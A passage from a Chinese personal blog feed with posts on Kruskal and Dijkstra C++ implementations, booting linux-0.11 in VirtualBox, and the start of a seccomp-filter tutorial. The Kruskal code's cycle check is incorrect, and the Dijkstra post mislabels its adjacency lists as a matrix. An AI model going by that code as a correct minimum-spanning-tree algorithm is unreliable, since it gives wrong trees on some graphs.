class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-Kruskal‘s-Algorithm"><a href="#2-Kruskal‘s-Algorithm" class="headerlink" title="2.Kruskal‘s Algorithm"></a>2.Kruskal‘s Algorithm</h2><h3 id="算法流程-1"><a href="#算法流程-1" class="headerlink" title="算法流程:"></a>算法流程:</h3><ol><li>将所有边按权值从小到大排序。</li><li>从排序号的边中选出最小的一个。若该边的两个端点已经连同，忽略。否则将这条边作为最小生成树的一条边。</li><li>重复步骤2，直到所有的节点都属于同一棵树。</li></ol><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现:"></a>代码实现:</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::priority_queue;</span><br><span class="line"><span class="keyword">using</span> std::pair;</span><br><span class="line"><span class="keyword">using</span> std::set;</span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line"><span class="type">int</span> vertex[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Edge&amp; left, <span class="type">const</span> Edge&amp; right)&#123;</span><br><span class="line"><span class="keyword">return</span> left.weight &gt; right.weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">10 6</span></span><br><span class="line"><span class="comment">19 1 5</span></span><br><span class="line"><span class="comment">21 1 6</span></span><br><span class="line"><span class="comment">33 5 6</span></span><br><span class="line"><span class="comment">16 1 2</span></span><br><span class="line"><span class="comment">18 5 4</span></span><br><span class="line"><span class="comment">11 6 2</span></span><br><span class="line"><span class="comment">14 6 4</span></span><br><span class="line"><span class="comment">6 2 4</span></span><br><span class="line"><span class="comment">5 2 3</span></span><br><span class="line"><span class="comment">10 4 3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">5 2 3</span></span><br><span class="line"><span class="comment">6 2 4</span></span><br><span class="line"><span class="comment">11 6 2</span></span><br><span class="line"><span class="comment">16 1 2</span></span><br><span class="line"><span class="comment">18 5 4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">vector&lt;Edge&gt; <span class="title">Kruskal</span><span class="params">(<span class="type">const</span> vector&lt;Edge&gt;&amp; G, <span class="type">int</span> vertexs)</span></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">将所有边按权重从小到大排序</span></span><br><span class="line"><span class="comment">然后选出边加入到树中。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">vector&lt;Edge&gt;ret;</span><br><span class="line">set&lt;<span class="type">int</span>&gt; vertex_in_tree;</span><br><span class="line">priority_queue &lt; Edge&gt; q;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp; edge : G)&#123;</span><br><span class="line">q.<span class="built_in">push</span>(edge);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">while</span> (vertex_in_tree.<span class="built_in">size</span>() &lt; vertexs)&#123;</span><br><span class="line"><span class="keyword">auto</span> t = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (vertex_in_tree.<span class="built_in">find</span>(t.vertex[<span class="number">0</span>]) != vertex_in_tree.<span class="built_in">end</span>() &amp;&amp;</span><br><span class="line">vertex_in_tree.<span class="built_in">find</span>(t.vertex[<span class="number">1</span>]) != vertex_in_tree.<span class="built_in">end</span>())&#123;</span><br><span class="line"><span class="comment">//已经连通了，再加就有回路了。</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//save edge</span></span><br><span class="line">ret.<span class="built_in">push_back</span>(t);</span><br><span class="line"></span><br><span class="line"><span class="comment">//add vertex to tree.</span></span><br><span class="line"><span class="keyword">if</span> (vertex_in_tree.<span class="built_in">find</span>(t.vertex[<span class="number">0</span>]) == vertex_in_tree.<span class="built_in">end</span>())&#123;</span><br><span class="line">vertex_in_tree.<span class="built_in">insert</span>(t.vertex[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (vertex_in_tree.<span class="built_in">find</span>(t.vertex[<span class="number">1</span>]) == vertex_in_tree.<span class="built_in">end</span>())&#123;</span><br><span class="line">vertex_in_tree.<span class="built_in">insert</span>(t.vertex[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> edges = <span class="number">0</span>,vertexs = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;edges, &amp;vertexs);</span><br><span class="line"></span><br><span class="line">vector&lt;Edge&gt; G;</span><br><span class="line">G.<span class="built_in">resize</span>(edges);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; edges; i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;G[i].weight, &amp;G[i].vertex[<span class="number">0</span>], &amp;G[i].vertex[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">auto</span> g = <span class="built_in">Kruskal</span>(G, vertexs);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;vertex : g)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, vertex.weight,vertex.vertex[<span class="number">0</span>],vertex.vertex[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;图-最小生成树&quot;&gt;&lt;a href=&quot;#图-最小生成树&quot; class=&quot;headerlink&quot; title=&quot;图-最小生成树&quot;&gt;&lt;/a&gt;图-最小生成树&lt;/h1&gt;&lt;h1 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>图-dijkstra</title>
    <link href="https://h4ckf0rfun.github.io/2022/11/20/%E5%9B%BE-dijkstra/"/>
    <id>https://h4ckf0rfun.github.io/2022/11/20/%E5%9B%BE-dijkstra/</id>
    <published>2022-11-19T18:40:42.000Z</published>
    <updated>2022-11-19T18:41:48.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="图-Dijkstra算法"><a href="#图-Dijkstra算法" class="headerlink" title="图-Dijkstra算法"></a>图-Dijkstra算法</h1><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h2><p>Dijkstra算法是用来求有向图中的最短路径的。</p><p>在经过该算法后，能得到这样一个表:</p><table><thead><tr><th>vertex</th><th>dist</th><th>from</th></tr></thead><tbody><tr><td>0</td><td></td><td></td></tr><tr><td>1</td><td></td><td></td></tr><tr><td>2</td><td></td><td></td></tr><tr><td>…</td><td></td><td></td></tr></tbody></table><p>其中vertex是图中的每一个节点，dist代表从起始位置到该节点的路径长度是多少，from表示该节点的商上游结点。</p><h2 id="算法流程："><a href="#算法流程：" class="headerlink" title="算法流程："></a>算法流程：</h2><p>准备工作：</p><ol><li>输入图G</li><li>初始化上面的表格，一开始距离起点的距离都是∞</li></ol><p>算法开始:</p><p>设起点为s,优先队列q.</p><ol><li>更新 表中s 的distance和from，由于s的distance改变了，下游节点会受到影响，因此将s 加入优先队列q</li><li>当q不为空的时候，取出q的第一个元素t，现在要继续遍历t的下游节点，如果从t到下游节点有更短的dist，就更新dist的值，并把下游节点加入到队列。</li></ol><p>(如果某个节点v的distance改变了，<strong>v的下游的节点会受到影响</strong>，因此我们先把v保存 到队列中，等一会儿再从队里中取出v，然后更新v的下游节点)</p><h2 id="代码实现："><a href="#代码实现：" class="headerlink" title="代码实现："></a>代码实现：</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::list;</span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> std::pair;</span><br><span class="line"><span class="keyword">using</span> std::priority_queue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">path</span>&#123;</span><br><span class="line"><span class="type">int</span> vertex;<span class="comment">//那个节点</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> distance;<span class="comment">//距离起点的距离.</span></span><br><span class="line"><span class="type">int</span> from;<span class="comment">//上游节点.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span>  <span class="keyword">operator</span> &lt;(<span class="type">const</span> path&amp; left, <span class="type">const</span> path&amp; right)&#123;</span><br><span class="line"><span class="keyword">return</span> left.distance &gt; right.distance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 节点 + 权值</span></span><br><span class="line">vector&lt;list&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;&gt;  G;</span><br><span class="line">vector&lt;path&gt; result;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dijkstra</span><span class="params">(<span class="type">int</span> start_vertex)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">priority_queue&lt;path&gt; q;</span><br><span class="line"></span><br><span class="line">result[start_vertex].distance = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">q.<span class="built_in">push</span>(result[start_vertex]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (q.<span class="built_in">size</span>())&#123;</span><br><span class="line"><span class="keyword">auto</span>  top = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历top 的下游节点，如果有更短的，则更新并且把下游节点装入队列。</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;next : G[top.vertex])&#123;</span><br><span class="line"><span class="comment">//有更短的。</span></span><br><span class="line"><span class="keyword">if</span> (top.distance + next.second &lt; result[next.first].distance)&#123;</span><br><span class="line"><span class="comment">//更新</span></span><br><span class="line">result[next.first].distance = top.distance + next.second;</span><br><span class="line">result[next.first].from = top.vertex;</span><br><span class="line"></span><br><span class="line"><span class="comment">//入队，必须要这样，因为下游节点可能会受到影响</span></span><br><span class="line">q.<span class="built_in">push</span>(result[next.first]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">6 10</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0 1 50</span></span><br><span class="line"><span class="comment">1 2 10</span></span><br><span class="line"><span class="comment">0 3 10</span></span><br><span class="line"><span class="comment">3 0 20</span></span><br><span class="line"><span class="comment">1 3 15</span></span><br><span class="line"><span class="comment">3 4 15</span></span><br><span class="line"><span class="comment">4 1 20</span></span><br><span class="line"><span class="comment">4 2 35</span></span><br><span class="line"><span class="comment">2 4 30</span></span><br><span class="line"><span class="comment">5 4 3</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//input graph;</span></span><br><span class="line"><span class="type">int</span> edges, vertex;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;vertex, &amp;edges);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">result.<span class="built_in">resize</span>(vertex);</span><br><span class="line">G.<span class="built_in">resize</span>(vertex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; G.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">result[i].vertex = i;</span><br><span class="line">result[i].from = <span class="number">-1</span>;</span><br><span class="line">result[i].distance = UINT_MAX;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; edges; i++)&#123;</span><br><span class="line"><span class="type">int</span> x, y, z;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;x, &amp;y, &amp;z);</span><br><span class="line">G[x].<span class="built_in">push_back</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(y, z));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> start_vertex;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;start_vertex);</span><br><span class="line"><span class="built_in">dijkstra</span>(start_vertex);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%10s%10s%10s\n&quot;</span>,<span class="string">&quot;vertex&quot;</span>,<span class="string">&quot;dist&quot;</span>,<span class="string">&quot;from&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp;path : result)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%10d%10d%10d\n&quot;</span>, path.vertex + <span class="number">1</span>, path.distance, path.from + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(上述代码中有向图的保存是使用邻接矩阵)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;图-Dijkstra算法&quot;&gt;&lt;a href=&quot;#图-Dijkstra算法&quot; class=&quot;headerlink&quot; title=&quot;图-Dijkstra算法&quot;&gt;&lt;/a&gt;图-Dijkstra算法&lt;/h1&gt;&lt;h2 id=&quot;概述：&quot;&gt;&lt;a href=&quot;#概述：&quot; class</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>linux-0.11学习记录-使用VirtualBox启动linux-0.11</title>
    <link href="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/"/>
    <id>https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/</id>
    <published>2022-11-17T17:22:27.000Z</published>
    <updated>2022-11-17T17:24:37.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用virtual-box-启动linux-0-11内核映像"><a href="#使用virtual-box-启动linux-0-11内核映像" class="headerlink" title="使用virtual box 启动linux-0.11内核映像"></a>使用virtual box 启动linux-0.11内核映像</h1><p>需要两个软盘，第一个软盘存放内核映像，第二个软盘存放文件系统(可能是叫文件系统?)</p><h2 id="写内核映像到软盘中"><a href="#写内核映像到软盘中" class="headerlink" title="写内核映像到软盘中."></a>写内核映像到软盘中.</h2><p>需要提前编译好内核映像</p><ol><li>使用bximage创建软盘</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install bximage</span><br></pre></td></tr></table></figure><ol start="2"><li>将内核映像写入到软盘中</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=boot.bin of=./boot.img bs=512  conv=notrunc</span><br></pre></td></tr></table></figure><h2 id="写文件系统到软盘中"><a href="#写文件系统到软盘中" class="headerlink" title="写文件系统到软盘中"></a>写文件系统到软盘中</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">sb@sb-virtual-machine:~/Desktop$ bximage </span><br><span class="line">========================================================================</span><br><span class="line">                                bximage</span><br><span class="line">  Disk Image Creation / Conversion / Resize and Commit Tool <span class="keyword">for</span> Bochs</span><br><span class="line">         <span class="variable">$Id</span>: bximage.cc 13481 2018-03-30 21:04:04Z vruppert $</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line">1. Create new floppy or hard disk image</span><br><span class="line">2. Convert hard disk image to other format (mode)</span><br><span class="line">3. Resize hard disk image</span><br><span class="line">4. Commit <span class="string">&#x27;undoable&#x27;</span> redolog to base image</span><br><span class="line">5. Disk image info</span><br><span class="line"></span><br><span class="line">0. Quit</span><br><span class="line"></span><br><span class="line">Please choose one [0] 1</span><br><span class="line"></span><br><span class="line">Create image</span><br><span class="line"></span><br><span class="line">Do you want to create a floppy disk image or a hard disk image?</span><br><span class="line">Please <span class="built_in">type</span> hd or fd. [hd] fd</span><br><span class="line"></span><br><span class="line">Choose the size of floppy disk image to create.</span><br><span class="line">Please <span class="built_in">type</span> 160k, 180k, 320k, 360k, 720k, 1.2M, 1.44M, 1.68M, 1.72M, or 2.88M.</span><br><span class="line"> [1.44M] </span><br><span class="line"></span><br><span class="line">What should be the name of the image?</span><br><span class="line">[a.img] root.img</span><br><span class="line"></span><br><span class="line">Creating floppy image <span class="string">&#x27;root.img&#x27;</span> with 2880 sectors</span><br><span class="line"></span><br><span class="line">The following line should appear <span class="keyword">in</span> your bochsrc:</span><br><span class="line">  floppya: image=<span class="string">&quot;root.img&quot;</span>, status=inserted</span><br><span class="line">sb@sb-virtual-machine:~/Desktop$ <span class="built_in">dd</span> <span class="keyword">if</span>=rootimage-0.11 of=./root.img bs=512 conv=notrunc</span><br><span class="line">2880+0 records <span class="keyword">in</span></span><br><span class="line">2880+0 records out</span><br><span class="line">1474560 bytes (1.5 MB, 1.4 MiB) copied, 0.0044515 s, 331 MB/s</span><br></pre></td></tr></table></figure><p>这个 rootimage-0.11 文件是从这个网站中找到的: <a href="http://www.oldlinux.org/Linux.old/bochs/">Index of &#x2F;Linux.old&#x2F;bochs&#x2F; (oldlinux.org)</a></p><p>下载链接: <a href="http://www.oldlinux.org/Linux.old/bochs/linux-0.11-devel-050518.zip">http://www.oldlinux.org/Linux.old/bochs/linux-0.11-devel-050518.zip</a> (这个貌似是bochs调试用的，暂时还没搞成功，先用vbox启动成功再说)</p><p>找到rootimage-0.11文件:</p><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled.png" alt="Untitled"></p><h2 id="启动linux-0-11"><a href="#启动linux-0-11" class="headerlink" title="启动linux-0.11"></a>启动linux-0.11</h2><p>现在我门有了两个文件:</p><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled%201.png" alt="Untitled"></p><p>到Virtual Box中添加这两个img文件:</p><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled%202.png" alt="Untitled"></p><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled%203.png" alt="Untitled"></p><p>然后 点击启动，就能开机了</p><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled%204.png" alt="Untitled"></p><h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识:"></a>补充知识:</h1><p>硬盘结构:</p><ol><li>盘片（platter）</li><li>磁头（head）</li><li>磁道（track）</li><li>扇区（sector）</li><li>柱面（cylinder）</li></ol><p><img src="https://h4ckf0rfun.github.io/2022/11/18/linux-0-11%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-%E4%BD%BF%E7%94%A8VirtualBox%E5%90%AF%E5%8A%A8linux-0-11/Untitled%205.png" alt="Untitled"></p><p>BIOS中断例程 查询:</p><p><a href="http://www.ablmcc.edu.hk/~scy/CIT/8086_bios_and_dos_interrupts.htm#int13h_02h">8086 bios and dos interrupts (IBM PC) (ablmcc.edu.hk)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用virtual-box-启动linux-0-11内核映像&quot;&gt;&lt;a href=&quot;#使用virtual-box-启动linux-0-11内核映像&quot; class=&quot;headerlink&quot; title=&quot;使用virtual box 启动linux-0.11内核映像&quot;&gt;</summary>
      
    
    
    
    <category term="linux" scheme="https://h4ckf0rfun.github.io/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>seccomp-filter</title>
    <link href="https://h4ckf0rfun.github.io/2022/11/15/seccomp-filter/"/>
    <id>https://h4ckf0rfun.github.io/2022/11/15/seccomp-filter/</id>
    <published>2022-11-15T15:46:59.000Z</published>
    <updated>2022-11-15T15:52:19.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="seccomp-filter"><a href="#seccomp-filter" class="headerlink" title="seccomp filter"></a>seccomp filter</h1><p>这个东西是能自定义过滤掉一些系统调用，应该是在syscall之前加了一个hook. 具体内核的实现还没有了解过.等之后抽空看一下.</p><p>这里记录一下如何编写:</p><ol><li>编写过滤规则</li></ol><p>类似汇编代码，在执行这段代码时，会给一个seccomp data作为参数，可以用ld 指令加载seccomp data指定偏移处的数据到 A 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>   nr;                   <span class="comment">/* System call number */</span></span><br><span class="line">    __u32 arch;                 <span class="comment">/* AUDIT_ARCH_* value (see &lt;linux/audit.h&gt;) */</span></span><br><span class="line">    __u64 instruction_pointer;  <span class="comment">/* CPU instruction pointer */</span></span><br><span class="line">    __u64 args[<span class="number">6</span>];              <span class="comment">/* Up to 6 system call arguments */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里给出一个例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ld [<span class="number">4</span>]                  <span class="comment">/* offsetof(struct seccomp_data, arch) */</span></span><br><span class="line">jne 